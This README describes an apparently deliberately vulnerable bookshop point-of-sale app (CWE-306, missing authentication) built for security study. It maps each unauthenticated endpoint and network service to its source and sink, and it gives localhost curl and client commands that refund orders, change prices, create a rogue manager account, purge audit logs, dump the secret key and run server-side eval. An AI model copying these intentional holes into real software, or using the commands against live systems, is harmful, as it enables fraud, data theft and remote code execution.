# Corner Bookshop Back-Office

Internal back-office and point-of-sale application for a neighborhood bookstore. Managers and cashiers manage the catalog, process orders and refunds, apply discounts during shifts, hold customer records, and configure store policies. POS registers and partner systems integrate with the backend through a payment webhook, a register WebSocket feed, a GraphQL catalog API, a legacy file-drop interface, and a set of backend network services (command service, event broker, cache admin, and an RPC endpoint).

## Technology Stack

- Python 3.12
- Flask
- Flask-SQLAlchemy (SQLite)
- Flask-Bcrypt
- PyJWT
- flask-sock (WebSocket)
- Ariadne (GraphQL)
- Standard-library `socketserver` and `xmlrpc.server` (backend network services)

## Setup

```bash
cd Examples/CWE-306/Python/bookshop-pos
python -m venv .venv
# Linux / macOS
source .venv/bin/activate
# Windows (PowerShell)
.venv\Scripts\Activate.ps1

pip install -r requirements.txt
```

## Run

```bash
python app.py
```

Application URL:
- http://127.0.0.1:5000

The application also starts four backend network services that bind to all interfaces (`0.0.0.0`) on dedicated ports:

| Service | Port |
|---------|------|
| TCP command service | 9100 |
| Event broker | 9110 |
| Cache admin | 9120 |
| Back-office RPC | 9130 |

These services start and stop together with the web app (they run as daemon threads in the same process). Stop the app fully (Ctrl+C) before restarting so the ports are released and there are no conflicts. The database is created and seeded on every startup, and the POS command folders are created under `data/commands/`. Restart the application to reset data after running state-changing tests.

## Seeded Accounts

- manager
  - username: `manager`
  - password: `manager123`
- cashier
  - username: `cashier`
  - password: `cashier123`

## Main Routes

Protected (require a valid session — sign in first):
- `GET /dashboard`
- `GET /catalog` (inline price updates)
- `GET /orders` (inline refunds; manager approve/void)
- `GET /customers` (directory and CSV export)
- `GET /shift`, `POST /shift/open`, `POST /shift/close`, `POST /shift/sale`
- `GET /admin/staff`, `POST /admin/staff` (manager only)
- `GET /management/policies`
- `GET /integrations`
- `GET /ops/export` (covered by the operations perimeter guard)

Public:
- `GET/POST /login`, `GET /logout`

Operational endpoints and interfaces:
- `POST /api/orders/<id>/refund`, `POST /api/books/<id>/price`, `GET /api/customers/export`, `POST /api/catalog/import`
- `POST /setup/bootstrap-user`
- `POST /management/policies/refunds`, `POST /management/policies/discounts`
- `POST /maintenance/rebuild-order-totals`
- `POST /webhooks/payments`
- `WS /ws/register`
- `GET/POST /graphql`
- `POST /ops/admin/purge-audit`
- `GET /internal-tools/config`
- `POST /console/eval`
- File-drop command interface watching `data/commands/incoming/`
- TCP command service (9100), event broker (9110), cache admin (9120), RPC (9130)

## Critical Functions and Access

### 1) Unauthenticated Web/API Endpoints

The operational integration endpoints in `routes/order_api.py` perform critical actions but are registered without the shared `require_auth` guard that the dashboard, catalog, orders, shift, and staff blueprints attach:

- `POST /api/orders/<id>/refund` — moves an order to `REFUNDED` or `REFUND_PENDING_MANAGER_APPROVAL` (financial state change).
- `POST /api/books/<id>/price` — changes a book's selling price (pricing tampering).
- `GET /api/customers/export` — returns a CSV of customer PII and order history.
- `POST /api/catalog/import` — bulk-creates/updates books from a posted list.

Three additional Category 1 entry points are reachable with no authentication:

- **Payment webhook** (`routes/webhooks.py`) — accepts payment-provider events with no sender verification (no HMAC/signature check).
  - Source: line 31 -> `@bp.route("/webhooks/payments", methods=["POST"])` / line 32 -> `def payments_webhook()` — event and `orderId` taken from the request body, no signature header verified
  - Sink: line 27 -> `db.session.commit()` (via `_apply_event`, line 9) — sets the order to `REFUNDED` / `PAID` / `PAYMENT_FAILED` anonymously
- **Register WebSocket feed** (`services/ws_feed.py`) — accepts sensitive message types before any authentication handshake.
  - Source: line 35 -> `@sock.route("/ws/register")` / line 36 -> `def register_feed(ws)` — `VOID_SALE` / `PRICE_SET` messages parsed from the socket with no auth
  - Sink: line 19 -> `db.session.commit()` (void sale) and line 29 -> `db.session.commit()` (price set), via `_apply_message` (line 7)
- **Catalog GraphQL** (`routes/graphql_api.py`) — mutations run without checking caller identity.
  - Source: line 82 -> `@bp.route("/graphql", methods=["POST"])` / line 83 -> `def graphql_server()` — mutation arguments from the GraphQL request
  - Sink: line 54 -> `db.session.commit()` (`setPrice`, resolver line 46) and line 67 -> `db.session.commit()` (`setStock`, resolver line 59)

### 2) Security-Config Authentication Gaps

- `POST /setup/bootstrap-user` (`routes/setup.py`) — first-run provisioning endpoint left mounted with no guard; creates manager or cashier accounts.
- `POST /management/policies/refunds` and `POST /management/policies/discounts` (`routes/management_api.py`) — policy-write blueprint registered without `require_auth` (the management view page attaches it).
- `POST /maintenance/rebuild-order-totals` (`routes/maintenance.py`) — resource-intensive batch whose guard is disabled by the `SETUP_MODE` feature flag.

Two additional Category 2 gaps come from how the security perimeter is wired:

- **Path-pattern mismatch** (`perimeter.py`) — a centralized `before_request` guard protects the operations console, but its pattern only matches a single path segment.
  - Mechanism: line 7 -> `_PROTECTED = re.compile(r"^/ops/[^/]+$")` — matches `/ops/export` (guarded) but not `/ops/admin/purge-audit` (two segments), so the latter slips the guard
  - Source: `routes/operations.py` line 26 -> `@bp.route("/ops/admin/purge-audit", methods=["POST"])` / line 27 -> `def ops_purge_audit()` — reached anonymously
  - Sink: line 29 -> `db.session.commit()` — deletes all audit-log rows (loss of auditability)
  - Contrast: `/ops/export` (line 9) is covered by the same guard and requires a session.
- **WSGI middleware ordering** (`app.py`, `wsgi_internal.py`) — the internal-tools sub-app is dispatched ahead of the authentication middleware.
  - Mechanism: `app.py` -> `app.wsgi_app = DispatcherMiddleware(PerimeterAuthMiddleware(app.wsgi_app, app), {"/internal-tools": internal_app})` — the dispatcher routes `/internal-tools` straight to the sub-app, so `PerimeterAuthMiddleware` (which only wraps the main app) never runs for it
  - Source: `wsgi_internal.py` line 8 -> `def internal_app(environ, start_response)` — anonymous request to `/internal-tools/config`
  - Sink: line 9 -> the config view returns the database URI and `SECRET_KEY` to an anonymous caller

### 3) Unauthenticated Network Services and Backend Interfaces

The legacy file-drop command interface (`services/command_watcher.py`) polls `data/commands/incoming/` and executes any JSON command file it finds, with no caller authentication and no signature check (`PRICE_UPDATE`, `SET_STOCK`, `VOID_SALE`, `DAILY_REPORT`).

Four backend network services bind to `0.0.0.0` and execute critical operations with no caller identity:

- **TCP command service** (`services/command_tcp.py`, port 9100) — custom text protocol.
  - Source: line 50 -> `def handle(self)` — `VOID_SALE` / `SET_PRICE` / `DUMP_CONFIG` parsed from the socket with no handshake
  - Sink: line 32 -> `db.session.commit()` (void sale) and line 42 -> `db.session.commit()` (set price); `DUMP_CONFIG` returns the database URI and `SECRET_KEY` (`_dump_config`, line 9)
- **Event broker** (`services/event_broker.py`, port 9110) — unauthenticated producers publish events the POS applies. The network handler and the DB write are decoupled by an in-memory queue across two threads, so the source and sink are not a direct call chain.
  - Source: line 64 -> `def handle(self)` reads the socket and line 12 -> `_accept(text)` enqueues the event at line 21 (`_events.put(...)`) with no auth — any producer can send `PUBLISH PRICE_UPDATED|REFUND_ISSUED|STOCK_ADJUSTED <json>`
  - Handoff: a separate consumer thread `_consume` (line 53, started at line 83) drains the queue (`_events.get()`, line 55) and calls `_apply` (line 25)
  - Sink: `_apply` commits at line 34 (`PRICE_UPDATED`), line 41 (`REFUND_ISSUED`), line 50 (`STOCK_ADJUSTED`)
- **Cache admin service** (`services/cache_admin.py`, port 9120) — cache-like admin protocol with no credentials.
  - Source: line 45 -> `def handle(self)` / line 11 -> `_dispatch(app, text)` — `GET_CONFIG` / `SET_DISCOUNT` / `FLUSH_SESSIONS` with no auth
  - Sink: `GET_CONFIG` returns the database URI and `SECRET_KEY`; `SET_DISCOUNT` commits at line 30 (raises the discount ceiling); `FLUSH_SESSIONS` clears the session cache and commits at line 39
- **Back-office RPC** (`services/rpc_server.py`, port 9130) — XML-RPC methods exposed with no auth interceptor. The methods are defined in `_build_functions` and exposed by `register_function`; an XML-RPC call is dispatched by `SimpleXMLRPCServer` into the matching function body, so line 70 is the exposure point and the commit is inside the function.
  - Source: line 70 -> `server.register_function(fn, name)` exposes `set_price` / `set_stock` / `refund_order` / `dump_config` with no auth check on the request handler — an XML-RPC client can invoke them directly
  - Sink: the invoked function body commits — `set_price` (defined line 9) at line 18, `set_stock` (line 21) at line 30, `refund_order` (line 33) at line 40; `dump_config` (line 43) returns the database URI and `SECRET_KEY`

A developer console is also exposed:

- **Management/debug console** (`routes/devconsole.py`) — server-side evaluation reachable with no authentication, and the development server runs with the Werkzeug debugger/evalex enabled (`app.run(..., debug=True, use_evalex=True)`).
  - Source: line 6 -> `@bp.route("/console/eval", methods=["POST"])` / line 7 -> `def console_eval()` — expression from the request body
  - Sink: line 10 -> `result = eval(expr)` — arbitrary code execution anonymously

## Verify Sinks

Each test below runs with **no credentials** against a critical function and shows that it executes. Restart the application to reset data after state-changing tests (`python app.py`). The text protocols (TCP/broker/cache) and the RPC/WebSocket endpoints are exercised with the helper clients in `clients/`.

Seeded data reference:

| Entity | ID | Notes |
|--------|----|-------|
| Order | 1 | Laura Bennett, PAID, total 16.99 |
| Order | 3 | Priya Nair, PAID, total 18.00 |
| Book  | 1 (ISBN 9780000000001) | The Midnight Library, 16.99 |
| Book  | 2 (ISBN 9780000000002) | Atomic Habits, 21.50 |

### 1) Unauthenticated Web/API Endpoints

**Linux / macOS:**

```bash
# Operational endpoints (no auth)
curl -s -X POST http://127.0.0.1:5000/api/orders/1/refund
curl -s -X POST http://127.0.0.1:5000/api/books/1/price -H "Content-Type: application/json" -d '{"price":1.00}'
curl -s http://127.0.0.1:5000/api/customers/export

# Payment webhook with NO signature (no auth)
curl -s -X POST http://127.0.0.1:5000/webhooks/payments \
  -H "Content-Type: application/json" -d '{"event":"payment.refunded","orderId":1}'

# GraphQL mutation (no auth)
curl -s -X POST http://127.0.0.1:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{ setPrice(bookId:1, price:0.99){ id price } }"}'

# WebSocket register feed (no auth) — uses the helper client
python clients/wscli.py ws://127.0.0.1:5000/ws/register '{"type":"PRICE_SET","bookId":1,"price":0.99}'
```

**Windows (PowerShell):**

```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/api/orders/1/refund" -Method POST
Invoke-RestMethod -Uri "http://127.0.0.1:5000/api/books/1/price" -Method POST -ContentType "application/json" -Body '{"price":1.00}'
Invoke-RestMethod -Uri "http://127.0.0.1:5000/api/customers/export"
Invoke-RestMethod -Uri "http://127.0.0.1:5000/webhooks/payments" -Method POST -ContentType "application/json" -Body '{"event":"payment.refunded","orderId":1}'
Invoke-RestMethod -Uri "http://127.0.0.1:5000/graphql" -Method POST -ContentType "application/json" -Body '{"query":"mutation{ setPrice(bookId:1, price:0.99){ id price } }"}'

# JSON passed to native python args must escape inner quotes as \" (PowerShell strips unescaped double quotes)
$priceSet = '{\"type\":\"PRICE_SET\",\"bookId\":1,\"price\":0.99}'
python clients/wscli.py ws://127.0.0.1:5000/ws/register $priceSet
```

**Expected:** Each call returns `200` and performs the action. The webhook sets the order to `REFUNDED` with no signature; the GraphQL mutation and the WebSocket message both change the book price — all without authentication.

### 2) Security-Config Authentication Gaps

**Linux / macOS:**

```bash
# Provisioning / policy / maintenance (no auth)
curl -s -X POST http://127.0.0.1:5000/setup/bootstrap-user -H "Content-Type: application/json" -d '{"username":"intruder","password":"intruder123","role":"manager"}'
curl -s -X POST http://127.0.0.1:5000/management/policies/discounts -H "Content-Type: application/json" -d '{"maxDiscountPercent":80}'
curl -s -X POST http://127.0.0.1:5000/maintenance/rebuild-order-totals

# Path-pattern mismatch: /ops/export is guarded, /ops/admin/purge-audit slips through
curl -s -o /dev/null -w "ops/export: %{http_code}\n" http://127.0.0.1:5000/ops/export
curl -s -X POST http://127.0.0.1:5000/ops/admin/purge-audit

# WSGI ordering: internal-tools sub-app reachable without auth
curl -s http://127.0.0.1:5000/internal-tools/config
```

**Windows (PowerShell):**

```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/setup/bootstrap-user" -Method POST -ContentType "application/json" -Body '{"username":"intruder","password":"intruder123","role":"manager"}'
Invoke-RestMethod -Uri "http://127.0.0.1:5000/management/policies/discounts" -Method POST -ContentType "application/json" -Body '{"maxDiscountPercent":80}'
Invoke-RestMethod -Uri "http://127.0.0.1:5000/maintenance/rebuild-order-totals" -Method POST

# /ops/export is guarded (401); /ops/admin/purge-audit slips through (200)
try { (Invoke-WebRequest -Uri "http://127.0.0.1:5000/ops/export" -UseBasicParsing).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }
Invoke-RestMethod -Uri "http://127.0.0.1:5000/ops/admin/purge-audit" -Method POST

Invoke-RestMethod -Uri "http://127.0.0.1:5000/internal-tools/config"
```

**Expected:** `bootstrap-user`, the policy change, and the rebuild all return `200`. `GET /ops/export` returns `401` (guarded) while `POST /ops/admin/purge-audit` returns `200` and purges the audit log. `GET /internal-tools/config` returns `200` with the database URI and secret key.

### 3) Unauthenticated Network Services and Backend Interfaces

**Linux / macOS:**

```bash
# TCP command service (9100)
python clients/linecli.py 9100 "SET_PRICE 2 3.33" "VOID_SALE 3" "DUMP_CONFIG"

# Event broker (9110) — unauthenticated producer
python clients/linecli.py 9110 'PUBLISH PRICE_UPDATED {"bookId":1,"price":2.22}' 'PUBLISH REFUND_ISSUED {"orderId":1}'

# Cache admin (9120)
python clients/linecli.py 9120 "GET_CONFIG" "SET_DISCOUNT 90" "FLUSH_SESSIONS"

# Back-office RPC (9130)
python clients/rpccli.py set_stock 1 500
python clients/rpccli.py dump_config

# Management/debug console — server-side eval (no auth)
curl -s -X POST http://127.0.0.1:5000/console/eval -H "Content-Type: application/json" -d '{"expr":"__import__(\"os\").getcwd()"}'

# File-drop (unsigned commands are executed)
echo '{"command":"PRICE_UPDATE","isbn":"9780000000003","price":2.22}' > data/commands/incoming/price.json
```

**Windows (PowerShell):**

```powershell
python clients/linecli.py 9100 "SET_PRICE 2 3.33" "VOID_SALE 3" "DUMP_CONFIG"

# JSON in native python args must escape inner quotes as \" (PowerShell strips unescaped double quotes)
$priceUpdated = 'PUBLISH PRICE_UPDATED {\"bookId\":1,\"price\":2.22}'
$refundIssued = 'PUBLISH REFUND_ISSUED {\"orderId\":1}'
$stockAdjusted = 'PUBLISH STOCK_ADJUSTED {\"bookId\":1,\"delta\":-3}'
python clients/linecli.py 9110 $priceUpdated $refundIssued $stockAdjusted

python clients/linecli.py 9120 "GET_CONFIG" "SET_DISCOUNT 90" "FLUSH_SESSIONS"
python clients/rpccli.py set_stock 1 500
python clients/rpccli.py dump_config
Invoke-RestMethod -Uri "http://127.0.0.1:5000/console/eval" -Method POST -ContentType "application/json" -Body '{"expr":"__import__(\"os\").getcwd()"}'
Set-Content data/commands/incoming/price.json '{"command":"PRICE_UPDATE","isbn":"9780000000003","price":2.22}'
```

**Expected:** Every command returns `OK ...` with no authentication: the TCP service voids/repriced and dumps the config; the broker queues events the consumer applies to the database; the cache service dumps config, raises the discount, and flushes sessions; the RPC methods change stock and dump config; the console returns the result of the evaluated expression; the unsigned file-drop command is executed.

## Manager Flows

- Sign in, review dashboard KPIs.
- Update book prices from the Catalog; process refunds, approve pending refunds, and void sales from Orders.
- Browse customers and export the customer list from Customers.
- Manage staff accounts under Staff.
- Review and update store policies under Policies.
- Review integration channels and recent integration activity under Integrations.

## Cashier Flows

- Sign in, open a shift, record sales with optional discounts, close the shift.
- Update book prices from the Catalog, process refunds from Orders, and export customers.
